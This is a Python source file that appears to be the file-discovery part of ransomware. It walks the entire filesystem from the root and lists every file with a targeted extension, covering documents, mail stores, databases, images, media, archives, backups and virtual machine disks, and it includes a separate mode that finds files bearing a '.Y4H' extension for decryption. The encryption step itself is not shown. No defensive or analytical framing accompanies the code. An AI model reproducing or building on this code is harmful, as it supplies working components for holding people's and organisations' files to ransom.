import os
import base64

def find_files(path,method):
    file_encrypt = {'.PY':0,'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
': 0, '.VSDX': 0, '.TXT': 0, '.CSV': 0, '.RTF': 0, '.WKS': 0, '.WK1': 0, '.PDF': 0, '.DWG': 0, '.ONETOC2': 0, '.SNT': 0
, '.JPEG': 0, '.JPG': 0, '.DOCB': 0, '.DOCM': 0, '.DOT': 0, '.DOTM': 0, '.DOTX': 0, '.XLSM': 0, '.XLSB': 0, '.XLW': 0, 
'.XLT': 0, '.XLM': 0, '.XLC': 0, '.XLTX': 0, '.XLTM': 0, '.PPTM': 0, '.POT': 0, '.PPS': 0, '.PPSM': 0, '.PPSX': 0, '.PP\
AM': 0, '.POTX': 0, '.POTM': 0, '.EDB': 0, '.HWP': 0, '.602': 0, '.SXI': 0, '.STI': 0, '.SLDX': 0, '.SLDM': 0, '.VDI': 
0, '.VMDK': 0, '.VMX': 0, '.GPG': 0, '.AES': 0, '.ARC': 0, '.PAQ': 0, '.BZ2': 0, '.TBK': 0, '.BAK': 0, '.TAR': 0, '.TGZ': 0, '.GZ': 0, '.7Z': 0, '.RAR': 0, '.ZIP': 0, '.BACKUP': 0, '.ISO': 0, '.VCD': 0, '.BMP': 0, '.PNG': 0, '.GIF': 0, '.RAW': 0, '.CGM': 0, '.TIF': 0, '.TIFF': 0, '.NEF': 0, '.PSD': 0, '.AI': 0, '.SVG': 0, '.DJVU': 0, '.M4U': 0,  '.WMA': 0, '.FLV': 0, '.3G2': 0, '.MKV': 0, '.3GP': 0, '.MP4': 0, '.MOV': 0, '.AVI': 0, '.ASF': 0, '.MPEG':0, '.RB': 0, '.ASP': 0, '.PHP': 0, '.JSP': 0}
    file_decrypt = {'.Y4H':0}
    if(method==1):
        file_format = file_encrypt
    else:
        file_format = file_decrypt
    f = []
    for actual_path, directories, files_found in os.walk(path):
        for arg in files_found:
            ext = os.path.splitext(os.path.join(actual_path, arg))[1].upper()
            if(file_format.get(ext) == 0 or ext == ''):
                f.append(os.path.join(actual_path, arg))
    return f

def d_main(method):
	return find_files('/',method)
